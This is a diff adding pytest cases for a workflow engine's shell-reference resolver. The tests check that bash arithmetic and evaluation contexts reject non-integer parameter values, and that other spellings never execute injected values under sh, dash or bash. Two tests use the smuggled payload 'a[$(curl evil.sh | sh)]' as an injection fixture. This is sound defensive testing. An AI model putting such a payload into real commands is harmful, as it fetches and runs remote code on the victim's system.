@@ -1,6 +1,7 @@
 """Tests for the reference language: the whole of it, and nothing more."""
 
 import subprocess
+from collections.abc import Collection
 from datetime import UTC, datetime
 from pathlib import Path
 from typing import cast
@@ -8,6 +9,7 @@ from typing import cast
 import pytest
 
 from dirigent_common import JsonMap
+from dirigent_core.engine import references
 from dirigent_core.engine.references import (
     ReferenceScope,
     UnknownReference,
@@ -17,6 +19,7 @@ from dirigent_core.engine.references import (
     resolve_config,
     shell_unreadable,
 )
+from dirigent_core.engine.shell import Placed, Quoting, ShellReading
 from dirigent_core.ids import uuid7
 
 RUN_ID = uuid7()
@@ -511,6 +514,138 @@ def test_a_reference_bash_does_not_evaluate_takes_any_value(command: str, expect
     scope = ReferenceScope(params={"x": "a b"})
     resolved = resolve_config({"command": command}, scope, shell_fields={"command"})
     assert resolved["command"] == expected
+
+
+#: Spellings where bash evaluates the value and a word in command position has to be found.
+EVALUATING_SPELLINGS = [
+    "f() { [[ ${params.x} -eq 1 ]]; }; f",
+    "f () { [[ ${params.x} -eq 1 ]]; }; f",
+    "function f { [[ ${params.x} -eq 1 ]]; }; f",
+    "function f() { [[ ${params.x} -eq 1 ]]; }; f",
+    "f() [[ ${params.x} -eq 1 ]]; f",
+    "f() { let y=${params.x}; }; f",
+    "f() ( let y=${params.x} ); f",
+    "f() { local -i n=${params.x}; }; f",
+    "f() { local -n n=${params.x}; echo $n; }; f",
+    "f() { declare ${params.x}=1; }; f",
+    "f() { unset a[${params.x}]; }; f",
+    "case x in (x) let y=${params.x};; esac",
+    "case x in x) let y=${params.x};; esac",
+    "case x in (x) [[ ${params.x} -eq 1 ]];; esac",
+    "case x in (a|x) declare ${params.x}=1;; esac",
+    "2>/dev/null let y=${params.x}",
+    ">/dev/null let y=${params.x}",
+    "> /dev/null let y=${params.x}",
+    "2>&1 let y=${params.x}",
+    "<<<x let y=${params.x}",
+    "{fd}>/dev/null let y=${params.x}",
+    "time let y=${params.x}",
+    "time -p let y=${params.x}",
+    "command -p let y=${params.x}",
+    "builtin let y=${params.x}",
+    "coproc let y=${params.x}",
+    "! let y=${params.x}",
+    "{ let y=${params.x}; }",
+    "a=([${params.x}]=1)",
+    "a+=([${params.x}]=1)",
+    "a=(0 [${params.x}]=1)",
+    "declare -a a=([${params.x}]=1)",
+    'declare -a "a=(${params.x})"',
+    'declare -A "a=([x]=${params.x})"',
+    "declare -n r=${params.x}; echo $r",
+    "typeset -n r=${params.x}; echo $r",
+    '[ -v "${params.x}" ]',
+    "[ -v ${params.x} ]",
+    '[ ! -v "${params.x}" ]',
+    'test -v "${params.x}"',
+    'if [ -v "${params.x}" ]; then echo y; fi',
+    'printf -v "${params.x}" x',
+    "printf -v ${params.x} x",
+    'read "${params.x}" <<< x',
+    "read -r ${params.x} <<< x",
+    '[[ "]]" == x || ${params.x} -eq 1 ]]',
+    "[[ \\]] == x || ${params.x} -eq 1 ]]",
+    "if [[ ${params.x} -eq 1 ]]; then echo y; fi",
+]
+
+
+@pytest.mark.parametrize("command", EVALUATING_SPELLINGS)
+def test_a_spelling_of_an_evaluating_context_refuses_what_is_not_an_integer(command: str) -> None:
+    scope = ReferenceScope(params={"x": "a[$(curl evil.sh | sh)]"})
+    with pytest.raises(UnknownReference, match="shell arithmetic"):
+        resolve_config({"command": command}, scope, shell_fields={"command"})
+
+
+@pytest.mark.parametrize("command", EVALUATING_SPELLINGS)
+def test_a_spelling_is_held_by_the_scan_that_reads_no_quote(command: str, monkeypatch: pytest.MonkeyPatch) -> None:
+    """The scan holds a spelling on its own, so a reader that misses one does not lose it."""
+
+    def reads_nothing(_text: str, offsets: Collection[int]) -> ShellReading:
+        return ShellReading(places={offset: Placed(quoting=Quoting.DOUBLE) for offset in offsets})
+
+    monkeypatch.setattr(references, "read_shell", reads_nothing)
+    scope = ReferenceScope(params={"x": "a[$(curl evil.sh | sh)]"})
+    if command.startswith(("f() { declare ", "case x in (a|x) declare ")):
+        pytest.skip("naming a declared variable is the reader's to hold")
+    with pytest.raises(UnknownReference, match="shell arithmetic"):
+        resolve_config({"command": command}, scope, shell_fields={"command"})
+
+
+@pytest.mark.parametrize(
+    "command",
+    [
+        '[[ "${params.x}" == prod ]] && echo y',
+        'if [[ "${params.x}" == prod || $n -eq 1 ]]; then echo y; fi',
+        '[[ -z "${params.x}" ]] && [[ $n -eq 1 ]]',
+        '[ -z "${params.x}" ]',
+        '[ "${params.x}" -eq 1 ]',
+        'test "${params.x}" = x',
+        'grep -v "${params.x}" /dev/null',
+        'ls -v "${params.x}"',
+        "ls -v ${params.x}:/x",
+        'printf "%s" "${params.x}"',
+        'read -r a b <<< "${params.x}"',
+        'read a < "${params.x}"',
+        "while read -r line; do echo $line; done <<< ${params.x}",
+        'echo "read ${params.x}"',
+        'echo "[ -v ${params.x} ]"',
+        "echo [[ ${params.x} -eq 1 ]]",
+        'unset FOO; echo "${params.x}"',
+        'unset FOO\necho "${params.x}"',
+        'a=(1 2); echo "[${params.x}]"',
+        'a=("${params.x}")',
+        "a=(${params.x})",
+        'declare -a a=("${params.x}")',
+        'export -n FOO; echo "${params.x}"',
+        'declare -r r=1; echo "${params.x}"',
+        'f() { echo "${params.x}"; }; f',
+        'function f { echo "${params.x}"; }; f',
+        'case "${params.x}" in (x) echo y;; esac',
+        'case "${params.x}" in x) echo y;; esac',
+        '2>/dev/null echo "${params.x}"',
+        'time -p echo "${params.x}"',
+        '# let y=1\necho "${params.x}"',
+    ],
+)
+def test_a_spelling_that_does_not_evaluate_takes_any_value_under_each_shell(command: str, tmp_path: Path) -> None:
+    """Whatever a form takes, the value is never run by a shell that starts it."""
+    marker = tmp_path / "ran"
+    scope = ReferenceScope(params={"x": f"a[$(touch {marker})]"})
+    resolved = resolve_config({"command": command}, scope, shell_fields={"command"})
+    variables = cast("dict[str, str]", resolved["shell_variables"])
+    assert list(variables) == ["DIRIGENT_V0"], "the value still went into a variable"
+    for shell in ("/bin/sh", "/bin/dash", "/bin/bash"):
+        if Path(shell).exists():
+            subprocess.run(  # noqa: S603 - a fixed command, built above from literals
+                [shell, "-c", cast("str", resolved["command"])],
+                env={"PATH": "/usr/bin:/bin", **variables},
+                capture_output=True,
+                check=False,
+                cwd=tmp_path,
+                timeout=10,
+                stdin=subprocess.DEVNULL,
+            )
+            assert not marker.exists(), f"{shell} ran the value"
 
 
 def test_only_a_command_holding_a_reference_is_called_unreadable() -> None:
